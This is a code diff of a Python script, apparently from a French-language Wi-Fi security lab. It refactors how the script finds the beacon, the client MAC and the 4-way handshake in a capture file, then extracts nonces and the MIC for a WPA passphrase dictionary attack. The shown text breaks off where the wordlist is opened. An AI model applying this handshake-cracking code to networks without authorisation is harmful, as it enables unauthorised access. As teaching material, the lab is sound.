@@ -20,21 +20,61 @@ def customPRF512(key,A,B):
         R = R+hmacsha1.digest()
     return R[:blen]
 
+def findBeacon(capture):
+    """
+    Cette fonction détecte et retourne le premier Beacon de la capture
+    """
+    for frame in capture:
+        if frame.type == 0 and frame.subtype == 8:
+            return frame
+
+def findAuthentication(APmac, capture):
+    """
+    Cette fonction détecte et retourne le mac du client en sa basant sur les messages d'authentification
+    """
+    for frame in capture:
+        if frame.type == 0 and frame.subtype == 11 and a2b_hex(frame.addr2.replace(':', '')) == APmac :
+            return a2b_hex(frame.addr1.replace(':', ''))
+
+def find4wayHandShake(capture):
+    """
+    Cette fonction détecte et retourne le premier 4 way handshake
+    """
+    handshake = []
+    for frame in capture:
+        if len(handshake) >= 4:
+            return handshake
+
+        # source AP --> client
+        if frame.type == 0x2 and frame.subtype == 0x0:
+            handshake.append(frame)
+
+        # source client --> AP
+        if frame.type == 0x0 and frame.subtype == 0x0 and frame.proto == 1:
+            handshake.append(frame)
+
+# Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa = rdpcap("wpa_handshake.cap")
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 passPhrase = "actuelle"
 A = "Pairwise key expansion"  # this string is used in the pseudo-random function
-ssid = wpa[0].info.decode("utf-8")
-APmac = a2b_hex(wpa[0].addr2.replace(':', ''))          # "cebcc8fdcab7"
-Clientmac = a2b_hex(wpa[2].addr2.replace(':', ''))      # "0013efd015bd"
+
+# recherche du premier beacon dans la capture
+Beacon = findBeacon(wpa)
+ssid = Beacon.info.decode("utf-8")
+APmac = a2b_hex(Beacon.addr2.replace(':', ''))          # "cebcc8fdcab7"
+Clientmac = findAuthentication(APmac, wpa)              # "0013efd015bd"
+
+# detection du handshake et renvoi des 4 trames
+handshake = find4wayHandShake(wpa)
 
 # Authenticator and Supplicant Nonces
-ANonce = wpa[5].getlayer(WPA_key).nonce                 # 90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91
-SNonce = raw(wpa[6])[65:-72]                            # 7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577
+ANonce = handshake[0].getlayer(WPA_key).nonce                 # 90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91
+SNonce = raw(handshake[1])[65:-72]                            # 7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577
 
 # if key_desciptor = 2 we use SHA-1 for the MIC and if key_desciptor = 1 we use MD5 
-key_information = raw(wpa[8])[54:55]
+key_information = raw(handshake[3])[54:55]
 mask = 0b00000111
 key_descriptor = int.from_bytes(key_information, "big") & mask
 
@@ -42,11 +82,10 @@ print("test : ", key_descriptor)
 
 # This is the MIC contained in the 4th frame of the 4-way handshake
 # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-mic_to_test = raw(wpa[8])[-18:-2].hex()                 # "36eef66540fa801ceee2fea9b7929b40"
+mic_to_test = raw(handshake[3])[-18:-2].hex()                 # "36eef66540fa801ceee2fea9b7929b40"
 
 B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)  # used in pseudo-random function
-data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")  # cf "Quelques détails importants" dans la donnée
-
+data = raw(handshake[3])[48:-18] + b"\x00" * 18  # cf "Quelques détails importants" dans la donnée
 
 with open('wordlist.txt','r') as file:
    
